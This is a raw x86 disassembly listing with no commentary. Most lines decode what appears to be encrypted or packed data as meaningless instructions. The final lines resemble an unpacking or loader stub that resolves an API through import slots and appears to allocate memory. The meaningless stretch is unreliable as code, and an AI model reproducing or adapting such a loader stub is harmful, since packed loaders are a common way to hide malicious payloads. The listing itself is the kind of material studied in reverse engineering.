  414bf2:	pop    es
  414bf3:	loope  0x414c60
  414bf5:	push   eax
  414bf6:	or     eax,0x25b8179a
  414bfb:	dec    ebp
  414bfc:	dec    edi
  414bfd:	adc    eax,0x4d0f2ee2
  414c02:	nop
  414c03:	jmp    0x414c25
  414c05:	lods   eax,DWORD PTR ds:[esi]
  414c06:	sbb    ah,BYTE PTR [edx-0x18ca533f]
  414c0c:	or     esi,ecx
  414c0e:	sbb    al,0xc1
  414c10:	or     BYTE PTR ds:[eax],dl
  414c13:	push   0xffffffb4
  414c15:	jnp    0x414baa
  414c17:	jae    0x414ba4
  414c19:	or     edi,DWORD PTR [ecx-0x7fc7e0e6]
  414c1f:	cmp    eax,0x156fce08
  414c24:	xor    ch,BYTE PTR [edx-0x4e6f1cef]
  414c2a:	cmp    eax,0x73258e09
  414c2f:	xor    ebp,DWORD PTR [ebp+0x7f5fc6b0]
  414c35:	xchg   DWORD PTR [eax+0x64d557ba],ebx
  414c3b:	adc    BYTE PTR [eax+ecx*1],0x3c
  414c3f:	call   DWORD PTR [esi]
  414c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c43:	fcomp  DWORD PTR [eax-0x56]
  414c46:	pushf  
  414c47:	ins    DWORD PTR es:[edi],dx
  414c48:	(bad)  [ecx+0x5d]
  414c4b:	(bad)  
  414c4c:	test   al,0x95
  414c4e:	int3   
  414c4f:	sahf   
  414c50:	xor    eax,esp
  414c52:	std    
  414c53:	fcmovnu st,st(2)
  414c55:	mov    ebx,0xe583122d
  414c5a:	sub    BYTE PTR [ebp+0x5b],bh
  414c5d:	cwde   
  414c5e:	add    eax,DWORD PTR [edx+0x7c05aecd]
  414c64:	out    0xea,al
  414c66:	pop    eax
  414c67:	mov    ebp,DWORD PTR [edi-0x47588c90]
  414c6d:	js     0x414c05
  414c6f:	cmp    eax,0x2bbd2d56
  414c74:	mov    esp,0xb97b46aa
  414c79:	jmp    0x9a7805a1
  414c7e:	loopne 0x414c7f
  414c80:	into   
  414c81:	add    al,dl
  414c83:	arpl   WORD PTR [ebp-0x7adc2697],bx
  414c89:	push   cs
  414c8a:	(bad)  
  414c8b:	loopne 0x414c4c
  414c8d:	dec    edx
  414c8e:	adc    edx,DWORD PTR [esi+0x5b]
  414c91:	pop    ss
  414c92:	fcomip st,st(6)
  414c94:	pushf  
  414c95:	mov    edx,0xbf4062d6
  414c9a:	movzx  ebx,al
  414c9d:	in     eax,dx
  414c9e:	in     al,dx
  414c9f:	rol    BYTE PTR [ebx],0x54
  414ca2:	mov    BYTE PTR [edx-0xc],0xca
  414ca6:	push   0x4a1bd7a6
  414cab:	xor    eax,0x1edb3305
  414cb0:	mov    dl,0x41
  414cb2:	outs   dx,BYTE PTR ds:[esi]
  414cb3:	shr    BYTE PTR [ebp-0x2c665e79],1
  414cb9:	repz jne 0x414c84
  414cbc:	add    edi,DWORD PTR [eax]
  414cbe:	dec    esp
  414cbf:	aam    0x50
  414cc1:	jnp    0x414c45
  414cc3:	outs   dx,BYTE PTR ds:[esi]
  414cc4:	repz sub cl,cl
  414cc7:	xor    eax,0xba9e7528
  414ccc:	dec    eax
  414ccd:	adc    al,BYTE PTR [eax-0x17]
  414cd0:	inc    ebp
  414cd1:	mov    dh,bh
  414cd3:	aam    0x68
  414cd5:	adc    cl,cl
  414cd7:	fisub  WORD PTR [ebp+0x5b]
  414cda:	push   ss
  414cdb:	bound  esp,QWORD PTR [eax+ebp*4+0x50cbb006]
  414ce2:	sub    edi,DWORD PTR [esi+0x42]
  414ce5:	jmp    0x414d2d
  414ce7:	inc    eax
  414ce8:	daa    
  414ce9:	mov    ebp,0x39eea2b6
  414cee:	lds    esi,FWORD PTR [eax+eax*2+0x188d6847]
  414cf5:	js     0x414ce6
  414cf7:	(bad)  
  414cf8:	cmp    eax,0x3b31b9ed
  414cfd:	shl    DWORD PTR [esi+0x5b42e15d],1
  414d03:	dec    esp
  414d04:	mov    al,ds:0x7a119e5b
  414d09:	and    BYTE PTR [ebp+0x4a],cl
  414d0c:	and    eax,0xd9146109
  414d11:	mov    ecx,0x5319fafb
  414d16:	sbb    BYTE PTR [ecx-0x788eaa47],dh
  414d1c:	sub    ebp,esp
  414d1e:	fimul  WORD PTR [esi]
  414d20:	mov    ecx,0x5fc5b70c
  414d25:	xchg   edx,eax
  414d26:	add    DWORD PTR [ebp+ebp*8+0x63dddd91],esi
  414d2d:	test   BYTE PTR [ebx+ecx*1-0x76],al
  414d31:	xchg   ebp,eax
  414d32:	dec    ebx
  414d33:	in     eax,dx
  414d34:	cmp    eax,0x1fe9ce61
  414d39:	cmp    al,0x74
  414d3b:	retf   0x6898
  414d3e:	xchg   esp,eax
  414d3f:	jl     0x414d3f
  414d41:	push   ebx
  414d42:	fisubr WORD PTR [ebx+edx*4-0x54]
  414d46:	sbb    BYTE PTR [eax],al
  414d48:	pop    ebx
  414d49:	test   DWORD PTR [ecx],0x2dcf08a3
  414d4f:	inc    ecx
  414d50:	pusha  
  414d51:	or     BYTE PTR [eax-0x3c],cl
  414d54:	aas    
  414d55:	in     al,0xcb
  414d57:	mov    al,0xb5
  414d59:	mov    ebp,0x150be754
  414d5e:	hlt    
  414d5f:	addr16 mov ds:0x449b,eax
  414d63:	sbb    DWORD PTR [ebp+0x45750844],eax
  414d69:	xlat   BYTE PTR ds:[ebx]
  414d6a:	lahf   
  414d6b:	test   BYTE PTR [ebx+esi*8],al
  414d6e:	mov    dh,0x60
  414d70:	mov    ?,WORD PTR [edx]
  414d72:	sahf   
  414d73:	pop    ebx
  414d74:	fdivr  st(4),st
  414d76:	dec    ebx
  414d77:	sbb    DWORD PTR [esp+eiz*4],edx
  414d7a:	dec    edi
  414d7b:	sub    DWORD PTR [ecx+0x4b],edx
  414d7e:	mov    ebp,0x2b2621eb
  414d83:	aas    
  414d84:	fcom   st(0)
  414d86:	test   al,0x93
  414d88:	movzx  ebp,bl
  414d8b:	add    BYTE PTR ds:[ebx],0xbe
  414d8f:	xor    bh,ch
  414d91:	dec    esi
  414d92:	sub    DWORD PTR [edx-0x5],ebx
  414d95:	clc    
  414d96:	ins    BYTE PTR es:[edi],dx
  414d97:	mov    eax,0xe20429d1
  414d9c:	retf   
  414d9d:	xor    eax,ecx
  414d9f:	or     BYTE PTR [eax-0x4],bh
  414da2:	pushf  
  414da3:	sub    esi,DWORD PTR [edi-0x34]
  414da6:	pop    edx
  414da7:	pop    ss
  414da8:	sbb    al,0xe9
  414daa:	repnz mov ds:0x340567c8,eax
  414db0:	loop   0x414db6
  414db2:	inc    ebp
  414db3:	sbb    BYTE PTR [ebx+esi*2-0x119416cc],bl
  414dba:	cmc    
  414dbb:	jp     0x414daf
  414dbd:	fbstp  TBYTE PTR [ebx-0x5527cc77]
  414dc3:	ds punpckhwd mm4,mm7
  414dc7:	mov    esi,0xf58d8d29
  414dcc:	ret    0x6494
  414dcf:	mov    edx,0x74e650cc
  414dd4:	or     ebp,ebp
  414dd6:	pop    ecx
  414dd7:	pop    eax
  414dd8:	(bad)  
  414dd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414dda:	xor    ah,BYTE PTR [ecx]
  414ddc:	imul   ebp,DWORD PTR ds:0x71a70dfb,0xffffffc8
  414de3:	mov    ebx,fs
  414de5:	shr    DWORD PTR [edi+0x4da293dc],0x60
  414dec:	fwait
  414ded:	lock sbb eax,0x30eeb883
  414df3:	add    cl,ah
  414df5:	xchg   esi,eax
  414df6:	fdiv   QWORD PTR [eax]
  414df8:	mov    esi,0x5b014068
  414dfd:	jae    0x414e5e
  414dff:	mov    al,ds:0xa1f48bbf
  414e04:	adc    bh,BYTE PTR [ebx-0x6f2f1266]
  414e0a:	sub    ecx,DWORD PTR [bp+si-0x25]
  414e0e:	sub    al,BYTE PTR [esi-0x71]
  414e11:	aad    0x54
  414e13:	mov    ecx,0x46176181
  414e18:	xchg   ecx,eax
  414e19:	pop    ebp
  414e1a:	shl    DWORD PTR [ebx+0x71],cl
  414e1d:	mov    edx,0xb3d8cecd
  414e22:	inc    esi
  414e23:	push   ds
  414e24:	and    ch,BYTE PTR [ebx-0x48]
  414e27:	mov    bl,0xf2
  414e29:	sbb    esi,DWORD PTR [ebx+ebx*4-0x6658ffb2]
  414e30:	rol    DWORD PTR ds:0x276e7603,cl
  414e36:	jae    0x414e97
  414e38:	cmp    DWORD PTR [eax-0x23],esp
  414e3b:	or     eax,0x9c4e6f4a
  414e40:	sbb    ecx,DWORD PTR [ebx-0x446fd3f0]
  414e46:	pop    esi
  414e47:	pop    edi
  414e48:	xor    al,0x91
  414e4a:	mov    al,ds:0xc904e9d9
  414e4f:	inc    BYTE PTR [eax+0x5e487ba]
  414e55:	fdivr  DWORD PTR [esi]
  414e57:	sub    DWORD PTR [ecx-0x6a],ebp
  414e5a:	out    0x19,eax
  414e5c:	call   0xa06c00a
  414e61:	jne    0x414e44
  414e63:	ficom  WORD PTR [edi+0x601db408]
  414e69:	test   eax,0x9eff8d40
  414e6e:	shl    BYTE PTR [ebx+0x5f],0xed
  414e72:	lahf   
  414e73:	je     0x414e24
  414e75:	mov    ah,0xec
  414e77:	adc    bl,dl
  414e79:	lods   eax,DWORD PTR ds:[esi]
  414e7a:	pushf  
  414e7b:	lock jmp 0x414e7c
  414e7e:	lds    ecx,FWORD PTR [ebp+0x61]
  414e81:	dec    ebp
  414e82:	push   edi
  414e83:	mov    ecx,0xe9c61c74
  414e88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e89:	add    edi,DWORD PTR [edi+0x17393a55]
  414e8f:	mov    ebx,0x64e4b77d
  414e94:	xlat   BYTE PTR ds:[ebx]
  414e95:	arpl   WORD PTR [esp+ecx*1-0x1b],si
  414e99:	nop
  414e9a:	add    cl,BYTE PTR [edi-0x22569128]
  414ea0:	mov    al,ds:0x88d167c0
  414ea5:	push   0xffffffdb
  414ea7:	popa   
  414ea8:	mov    dl,0xc5
  414eaa:	and    dl,BYTE PTR ds:[ebx+ebp*4]
  414eae:	add    eax,0x8c49112
  414eb3:	popa   
  414eb4:	xchg   ebx,eax
  414eb5:	out    dx,al
  414eb6:	ja     0x414efc
  414eb8:	mov    ebp,DWORD PTR [bp+di-0x5c]
  414ebc:	xchg   esp,eax
  414ebd:	(bad)  
  414ebf:	int3   
  414ec0:	adc    cl,BYTE PTR [ebx+0x5c64b9df]
  414ec6:	dec    ebp
  414ec7:	xchg   ecx,eax
  414ec8:	mov    eax,DWORD PTR [edx]
  414eca:	in     eax,0x99
  414ecc:	or     DWORD PTR [esi+0x17],edx
  414ecf:	push   eax
  414ed0:	call   0xac96831b
  414ed5:	pusha  
  414ed6:	jg     0x414f0c
  414ed8:	or     DWORD PTR [esi-0x10],edi
  414edb:	stos   BYTE PTR es:[edi],al
  414edc:	call   0x5716:0xac033e05
  414ee3:	push   edx
  414ee4:	push   ebp
  414ee5:	jge    0x414e7d
  414ee7:	scas   eax,DWORD PTR es:[edi]
  414ee8:	mov    ds:0x84056ac5,al
  414eed:	xchg   DWORD PTR [eax+0x11a19b4d],edi
  414ef3:	jecxz  0x414eb0
  414ef5:	addr16 mov al,ds:0xe79a
  414ef9:	mov    bh,0x99
  414efb:	dec    esp
  414efc:	add    dh,BYTE PTR [eax]
  414efe:	imul   ebp,DWORD PTR [ebp+0x175db32b],0x51a29e5f
  414f08:	mov    edx,0x2ccd6ca
  414f0d:	fimul  WORD PTR [eax]
  414f0f:	inc    BYTE PTR [ebx]
  414f11:	jo     0x414f77
  414f13:	dec    edx
  414f14:	inc    ebx
  414f15:	sbb    eax,0x1122f7f8
  414f1a:	dec    edx
  414f1b:	js     0x414efd
  414f1d:	xchg   DWORD PTR [eax],ecx
  414f1f:	or     dl,dh
  414f21:	in     eax,dx
  414f22:	dec    edx
  414f23:	push   ebp
  414f24:	cmc    
  414f25:	push   es
  414f26:	and    DWORD PTR [ecx+0x64ecd576],edx
  414f2c:	enter  0xe1c6,0x96
  414f30:	repz xchg ecx,eax
  414f32:	cmp    ch,BYTE PTR [ecx-0x60]
  414f35:	jbe    0x414f62
  414f37:	mov    WORD PTR [esi-0x15200cc9],ss
  414f3d:	sbb    edx,DWORD PTR [ebp-0x4c1f3b1]
  414f43:	neg    DWORD PTR [edi+0x81824ab]
  414f49:	and    eax,0xf05c8dba
  414f4e:	int3   
  414f4f:	fs je  0x414f03
  414f52:	in     al,dx
  414f53:	xor    BYTE PTR [edi-0x79],bl
  414f56:	sub    al,BYTE PTR [eax+0xc]
  414f59:	sar    DWORD PTR [esi+0x7d],cl
  414f5c:	data16 fisubr DWORD PTR [ebx]
  414f5f:	jnp    0x414f9d
  414f61:	mov    esi,0x6782bd8d
  414f66:	ins    BYTE PTR es:[edi],dx
  414f67:	in     al,dx
  414f68:	pop    esi
  414f69:	mov    al,ds:0xf615c428
  414f6e:	mov    DWORD PTR [ebx+0x6],edi
  414f71:	ds stc 
  414f73:	sbb    al,0x81
  414f75:	push   ebx
  414f76:	(bad)  
  414f77:	into   
  414f78:	(bad)  
  414f79:	into   
  414f7a:	adc    dh,ah
  414f7c:	xchg   DWORD PTR [ecx+ebx*1-0x179a9bf4],edi
  414f83:	hlt    
  414f84:	inc    eax
  414f85:	pop    esp
  414f86:	rol    dh,0x1e
  414f89:	in     eax,0xde
  414f8b:	push   ebx
  414f8c:	scas   al,BYTE PTR es:[edi]
  414f8d:	cmp    BYTE PTR [eax+ebp*1+0x18bd47b7],0x6c
  414f95:	je     0x414f82
  414f97:	jo     0x414feb
  414f99:	jmp    0x93bde127
  414f9e:	(bad)  
  414f9f:	ds pop ebx
  414fa1:	cli    
  414fa2:	ret    
  414fa3:	mov    dh,0xfe
  414fa5:	leave  
  414fa6:	xor    eax,0x2caaa4e2
  414fab:	dec    ebp
  414fac:	retf   0xa182
  414faf:	add    ebx,DWORD PTR [eax]
  414fb1:	adc    ecx,0x54
  414fb4:	sub    BYTE PTR es:[eax],ah
  414fb7:	fsubr  DWORD PTR [edx+0x6a]
  414fba:	fld    QWORD PTR [edi+0x18]
  414fbd:	add    DWORD PTR [edi],ecx
  414fbf:	push   esi
  414fc0:	ins    BYTE PTR es:[edi],dx
  414fc1:	aas    
  414fc2:	retf   0x5826
  414fc5:	jo     0x414f62
  414fc7:	xchg   esp,eax
  414fc8:	shl    DWORD PTR [edi],cl
  414fca:	dec    eax
  414fcb:	rep outs dx,DWORD PTR ds:[esi]
  414fcd:	loope  0x414f67
  414fcf:	jle    0x415049
  414fd1:	xchg   BYTE PTR [eax],cl
  414fd3:	aaa    
  414fd4:	loopne 0x414f8b
  414fd6:	icebp  
  414fd7:	fmul   st(1),st
  414fd9:	je     0x414f61
  414fdb:	xchg   esi,eax
  414fdc:	cmp    eax,0x57b8697b
  414fe1:	addr16 in eax,dx
  414fe3:	jbe    0x41504a
  414fe5:	inc    edx
  414fe6:	or     eax,0x6d111fe0
  414feb:	pop    ss
  414fec:	pop    esi
  414fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fee:	iret   
  414fef:	cmp    DWORD PTR [edx-0x68],ebx
  414ff2:	inc    ebp
  414ff3:	and    al,0xc6
  414ff5:	xchg   esi,eax
  414ff6:	in     al,0x5b
  414ff8:	popa   
  414ff9:	xchg   ebp,eax
  414ffa:	int    0x34
  414ffc:	inc    DWORD PTR [ebp-0x1e67c94c]
  415002:	push   ebp
  415003:	call   0xb182861e
  415008:	daa    
  415009:	mov    dh,0x8c
  41500b:	mov    WORD PTR [esi-0x28],ss
  41500e:	cmp    ecx,edx
  415010:	hlt    
  415011:	ror    BYTE PTR [esi],cl
  415013:	cmp    eax,0xda4688c9
  415018:	pop    edx
  415019:	repz push edi
  41501b:	scas   al,BYTE PTR es:[edi]
  41501c:	xor    edx,DWORD PTR [eax+0x3a]
  41501f:	adc    cl,dh
  415021:	sub    dh,BYTE PTR [ecx]
  415023:	and    al,0x71
  415025:	js     0x414feb
  415027:	and    edi,DWORD PTR [ecx+0x16]
  41502a:	cs popa 
  41502c:	sbb    DWORD PTR ss:[edi],esi
  41502f:	xchg   edx,eax
  415030:	cmp    DWORD PTR [eax+0x45cdc148],ebx
  415036:	adc    DWORD PTR [edi*1+0x2a671991],edi
  41503d:	ins    DWORD PTR es:[edi],dx
  41503e:	xor    al,0xcd
  415040:	lea    eax,[edx]
  415042:	loope  0x415010
  415044:	mov    dh,BYTE PTR [ecx-0x6766788c]
  41504a:	dec    ebp
  41504b:	(bad)  
  41504d:	inc    esp
  41504e:	pop    ebx
  41504f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415050:	push   edx
  415051:	xchg   edx,eax
  415052:	into   
  415053:	fstp   TBYTE PTR [edx]
  415055:	sbb    eax,0x794e9e04
  41505a:	pop    ss
  41505b:	loope  0x414ff0
  41505d:	jne    0x415098
  41505f:	push   esp
  415060:	test   edx,0xdf2a21e
  415066:	xchg   eax,ebp
  415068:	ins    BYTE PTR es:[edi],dx
  415069:	sbb    cl,BYTE PTR [edi+0x7a]
  41506c:	mov    dl,dh
  41506e:	xchg   edi,eax
  41506f:	inc    edx
  415070:	mov    ebp,0x80470ede
  415075:	jl     0x4150c7
  415077:	cmp    ah,BYTE PTR [ebx-0x34ae33e9]
  41507d:	mov    al,0x36
  41507f:	cwde   
  415080:	sbb    esi,DWORD PTR [ebp+0x58]
  415083:	jecxz  0x415097
  415085:	or     BYTE PTR [eax+0x2644e204],bl
  41508b:	in     eax,dx
  41508c:	mov    BYTE PTR [ebx+ecx*2-0x6af60c1b],cl
  415093:	push   edx
  415094:	inc    esi
  415095:	cli    
  415096:	das    
  415097:	rcl    DWORD PTR [edi+eax*4],0x95
  41509b:	scas   eax,DWORD PTR es:[edi]
  41509c:	(bad)  
  41509d:	pop    ecx
  41509e:	ror    ebp,0x7c
  4150a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150a2:	int    0xf8
  4150a4:	mov    cl,0x4b
  4150a6:	jns    0x415072
  4150a8:	dec    esi
  4150a9:	iret   
  4150aa:	mov    al,ds:0x75603464
  4150af:	pop    ds
  4150b0:	(bad)  
  4150b1:	rcl    BYTE PTR [ebx+0x17],1
  4150b4:	fiadd  DWORD PTR [edi-0x30]
  4150b7:	mov    ebp,0x1ce5d867
  4150bc:	dec    esi
  4150bd:	add    ch,BYTE PTR [ecx]
  4150bf:	mov    ecx,0x4d2e5c3d
  4150c4:	jl     0x4150a5
  4150c6:	call   0x5c9ed26d
  4150cb:	cli    
  4150cc:	dec    esp
  4150cd:	aaa    
  4150ce:	xchg   ecx,eax
  4150cf:	add    edi,DWORD PTR [esi]
  4150d1:	cmc    
  4150d2:	mov    esi,0x64ed9a6e
  4150d7:	pusha  
  4150d8:	add    eax,0xffffffbc
  4150db:	jo     0x415066
  4150dd:	add    al,0x18
  4150df:	mov    ds,WORD PTR [ecx+0x658e564]
  4150e5:	fidiv  DWORD PTR [esp+esi*4+0x63da570b]
  4150ec:	mov    edi,0x5ab98729
  4150f1:	sub    ebx,DWORD PTR ds:0xd297fd72
  4150f7:	add    DWORD PTR [ebx-0x74c23082],eax
  4150fd:	mov    esp,0xcc81570a
  415102:	or     edi,eax
  415104:	adc    ecx,ebx
  415106:	xor    DWORD PTR [ecx-0x5b45b5b5],esi
  41510c:	lods   al,BYTE PTR ds:[esi]
  41510d:	popf   
  41510e:	cmc    
  41510f:	test   BYTE PTR [edx],ah
  415111:	jl     0x41510d
  415113:	sbb    DWORD PTR [esi],eax
  415115:	imul   ebx,DWORD PTR [edi+ebx*2-0x2df779eb],0x6f
  41511d:	push   ebp
  41511e:	and    esp,DWORD PTR [ecx+eax*4-0x69e95a53]
  415125:	fs push esp
  415127:	test   eax,0x7e8a45e5
  41512c:	push   ebx
  41512d:	jmp    0xf7950bc2
  415132:	stos   BYTE PTR es:[edi],al
  415133:	sbb    dh,BYTE PTR [ecx-0x2e2b45f0]
  415139:	repnz iret 
  41513b:	stc    
  41513c:	push   eax
  41513d:	push   esi
  41513e:	repnz (bad) 
  415140:	ja     0x4151af
  415142:	adc    al,0x7c
  415144:	mov    ds:0x5f90d97a,al
  415149:	cmp    ebp,edx
  41514b:	mov    bl,al
  41514d:	imul   eax,DWORD PTR [edi+0x27],0xffffffdd
  415151:	xchg   esp,eax
  415152:	sbb    al,0x3
  415154:	and    eax,esp
  415156:	pop    es
  415157:	hlt    
  415158:	std    
  415159:	sub    al,0xe7
  41515b:	inc    ecx
  41515c:	shl    BYTE PTR [esp+esi*2],0xbf
  415160:	call   0xee65:0xbc28368b
  415167:	or     ecx,DWORD PTR [ebx+0xce20061]
  41516d:	mov    cl,0xdc
  41516f:	int3   
  415170:	test   ch,bl
  415172:	cmp    edi,DWORD PTR ds:0xd2077e71
  415178:	jno    0x4151f1
  41517a:	inc    esp
  41517b:	inc    ebx
  41517c:	pop    DWORD PTR [esi+esi*8]
  41517f:	popa   
  415180:	hlt    
  415181:	aas    
  415182:	fsub   QWORD PTR [eiz*4+0x54b35774]
  415189:	scas   eax,DWORD PTR es:[edi]
  41518a:	inc    ecx
  41518b:	(bad)  
  41518d:	cld    
  41518e:	mov    esi,0xe0521200
  415193:	xlat   BYTE PTR ds:[ebx]
  415194:	inc    ecx
  415195:	xor    al,0x73
  415197:	xchg   ebx,eax
  415198:	fwait
  415199:	not    BYTE PTR [esi]
  41519b:	scas   al,BYTE PTR es:[edi]
  41519c:	lods   eax,DWORD PTR ds:[esi]
  41519d:	gs push es
  41519f:	sub    ch,cl
  4151a1:	push   ebx
  4151a2:	hlt    
  4151a3:	std    
  4151a4:	xlat   BYTE PTR ds:[ebx]
  4151a5:	add    BYTE PTR [esi-0x77],al
  4151a8:	fisubr DWORD PTR ss:[esp+ebx*8+0x2e]
  4151ad:	mov    ds:0x52d628ed,eax
  4151b2:	in     al,0x66
  4151b4:	mov    al,0x6f
  4151b6:	xchg   esi,eax
  4151b7:	push   ds
  4151b8:	pop    esp
  4151b9:	add    eax,0xb7557cfa
  4151be:	cmp    eax,0x9deeeaa
  4151c3:	imul   edx,DWORD PTR [ebp+0x13a8681f],0x52a8126
  4151cd:	call   0x8534:0xb279f8a2
  4151d4:	popf   
  4151d5:	jnp    0x415164
  4151d7:	int    0xb8
  4151d9:	jmp    0x6658:0xac00da75
  4151e0:	pop    es
  4151e1:	clc    
  4151e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151e3:	(bad)  
  4151e5:	(bad)  
  4151e6:	pop    esi
  4151e7:	jns    0x41521c
  4151e9:	test   BYTE PTR [ecx],ch
  4151eb:	(bad)  
  4151ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ed:	pop    eax
  4151ee:	mov    DWORD PTR [edx],ebx
  4151f0:	popf   
  4151f1:	push   0x38
  4151f3:	(bad)  
  4151f4:	and    al,0xbd
  4151f6:	inc    dx
  4151f8:	inc    ecx
  4151f9:	mov    dl,0x3c
  4151fb:	in     eax,0x64
  4151fd:	out    dx,eax
  4151fe:	mov    al,ds:0x1f8184f7
  415203:	rcl    al,cl
  415205:	mov    eax,ds:0x627d6a9c
  41520a:	dec    BYTE PTR [edx+0x4ad5a5c7]
  415210:	stc    
  415211:	and    BYTE PTR [edx+0x60e26fc8],ah
  415217:	scas   al,BYTE PTR es:[edi]
  415218:	jle    0x415224
  41521a:	popf   
  41521b:	mov    bl,0x14
  41521d:	mov    ah,BYTE PTR [edi+edi*4-0x96c8264]
  415224:	mov    ecx,0x9ddbd9c7
  415229:	aaa    
  41522a:	sar    DWORD PTR [ebp+0x5b04e961],cl
  415230:	loopne 0x41521c
  415232:	jg     0x415248
  415234:	xchg   edx,eax
  415235:	test   BYTE PTR [edx-0x58ddb191],0x4b
  41523c:	cmp    al,0xe2
  41523e:	mov    edi,0x1345f4ac
  415243:	xor    DWORD PTR [eax+0x31afe35c],edi
  415249:	hlt    
  41524a:	lock push ds
  41524c:	sub    eax,0x75d1dc7d
  415251:	xchg   DWORD PTR [edi],esp
  415253:	sahf   
  415254:	mov    esp,0xa79e1c80
  415259:	mov    ds:0x1e37bdf1,al
  41525e:	pop    edx
  41525f:	retf   0xf6ce
  415262:	es inc eax
  415264:	inc    esi
  415265:	and    DWORD PTR [ebx+0x67],ebp
  415268:	mov    dh,0x31
  41526a:	add    eax,0xf29dfeed
  41526f:	mov    edx,0xc4684cfa
  415274:	dec    ecx
  415275:	fucomi st,st(3)
  415277:	retf   
  415278:	jbe    0x415201
  41527a:	jmp    0x4152e4
  41527c:	and    ah,BYTE PTR [edx]
  41527e:	pop    es
  41527f:	xchg   ecx,eax
  415280:	xor    al,BYTE PTR fs:[ecx+edi*4-0x47]
  415285:	and    edi,DWORD PTR [ecx]
  415287:	mov    bh,0x94
  415289:	iret   
  41528a:	dec    edi
  41528b:	pop    ebx
  41528c:	push   ss
  41528d:	in     al,dx
  41528e:	xor    BYTE PTR [ecx+0x29],al
  415291:	out    dx,al
  415292:	dec    ebp
  415293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415294:	in     eax,0xe6
  415296:	cmp    eax,0x7299df1d
  41529b:	sahf   
  41529c:	call   0x1083c420
  4152a1:	mov    ah,0xfb
  4152a3:	clc    
  4152a4:	or     DWORD PTR [ebx+0x39],0xffffffb4
  4152a8:	mov    ah,0xd5
  4152aa:	clc    
  4152ab:	mov    ebp,0x3c5b76ac
  4152b0:	dec    ebp
  4152b1:	mov    ah,0x96
  4152b3:	scas   eax,DWORD PTR es:[edi]
  4152b4:	test   eax,0x241d7e62
  4152b9:	add    dh,BYTE PTR [ecx]
  4152bb:	push   ss
  4152bc:	dec    esp
  4152bd:	call   0x3c4:0xd703f64d
  4152c4:	mov    WORD PTR [edi-0x729ee5ed],cs
  4152ca:	lock and dh,BYTE PTR [eax+edi*2-0x77]
  4152cf:	outs   dx,DWORD PTR ds:[esi]
  4152d0:	lea    ebx,[eax-0x14]
  4152d3:	les    ebx,FWORD PTR [ecx+0x73]
  4152d6:	xor    eax,ebp
  4152d8:	jmp    0xece28c8
  4152dd:	sti    
  4152de:	sub    eax,0x52901e64
  4152e3:	lods   al,BYTE PTR ds:[esi]
  4152e4:	xchg   ebx,eax
  4152e5:	sub    al,0x17
  4152e7:	cli    
  4152e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152e9:	adc    al,0x17
  4152eb:	add    dl,al
  4152ed:	dec    ebx
  4152ee:	push   esi
  4152ef:	mov    ss,WORD PTR [ebp+edi*1-0x15]
  4152f3:	mov    dh,0xba
  4152f5:	mov    ds:0x9438ef33,al
  4152fa:	and    eax,0x585b5427
  4152ff:	inc    ebp
  415300:	adc    bl,dl
  415302:	ret    0x7dab
  415305:	and    DWORD PTR [edi],ecx
  415307:	xor    DWORD PTR [edx-0x4f],0x26c29871
  41530e:	cli    
  41530f:	icebp  
  415310:	push   edi
  415311:	and    DWORD PTR [edx],ebp
  415313:	add    eax,0xbc11475f
  415318:	repnz cdq 
  41531a:	pop    ebx
  41531c:	add    DWORD PTR [ecx-0x4f9d8fcb],ebx
  415322:	cmp    dh,bl
  415324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415325:	push   eax
  415326:	cmp    BYTE PTR [edx+0x67a59f7c],ah
  41532c:	outs   dx,BYTE PTR ds:[esi]
  41532d:	cdq    
  41532e:	(bad)  
  415330:	jg     0x41539d
  415332:	inc    ecx
  415333:	sbb    DWORD PTR [esi-0x24],ecx
  415336:	mov    edx,0x19bdc101
  41533b:	je     0x4153bc
  41533d:	stos   DWORD PTR es:[edi],eax
  41533e:	add    bh,BYTE PTR [eax]
  415340:	jno    0x4152e7
  415342:	in     al,dx
  415343:	and    eax,0xe6e49e12
  415348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415349:	sar    edi,cl
  41534b:	adc    eax,0x41702c
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	movzx  edx,WORD PTR [ebp-0x2c]
  415357:	cmp    edx,0x539
  41535d:	jne    0x41538e
  41535f:	mov    DWORD PTR [ebp-0x14],0xe0d
  415366:	lea    eax,[ebp-0x28]
  415369:	push   eax
  41536a:	call   DWORD PTR ds:0x417030
  415370:	mov    DWORD PTR [ebp-0x60],eax
  415373:	mov    DWORD PTR [ebp-0x54],0x3a
  41537a:	mov    BYTE PTR [ebp-0x34],0x0
  41537e:	mov    DWORD PTR [ebp-0x8],0xde988b0f
  415385:	mov    DWORD PTR [ebp-0x68],0x10acf7
  41538c:	jmp    0x415395
  41538e:	mov    BYTE PTR ds:0x419f40,0x0
  415395:	push   0x0
  415397:	call   DWORD PTR ds:0x417030
  41539d:	mov    DWORD PTR [ebp-0x2c],eax
  4153a0:	push   DWORD PTR ds:0x417030
  4153a6:	pop    edx
  4153a7:	mov    DWORD PTR [ebp-0x6c],edx
  4153aa:	lea    ecx,[ebp-0x40]
  4153ad:	push   ecx
  4153ae:	mov    edx,DWORD PTR [ebp-0x60]
  4153b1:	push   edx
  4153b2:	call   DWORD PTR ds:0x417038
  4153b8:	mov    DWORD PTR [ebp-0x44],eax
  4153bb:	push   DWORD PTR [ebp-0x30]
  4153be:	push   0x1000
  4153c3:	mov    eax,DWORD PTR [ebp-0x14]
  4153c6:	add    eax,0x23
  4153c9:	add    eax,0x23
  4153cc:	push   eax
  4153cd:	xor    eax,eax
  4153cf:	push   eax
  4153d0:	mov    ecx,DWORD PTR [ebp-0x44]
  4153d3:	call   ecx
  4153d5:	push   eax
  4153d6:	pop    ecx
  4153d7:	mov    DWORD PTR [ebp-0x4],ecx
  4153da:	mov    eax,DWORD PTR [ebp-0x68]
  4153dd:	sub    eax,0xdae0b
  4153e2:	mov    DWORD PTR [ebp-0x68],eax
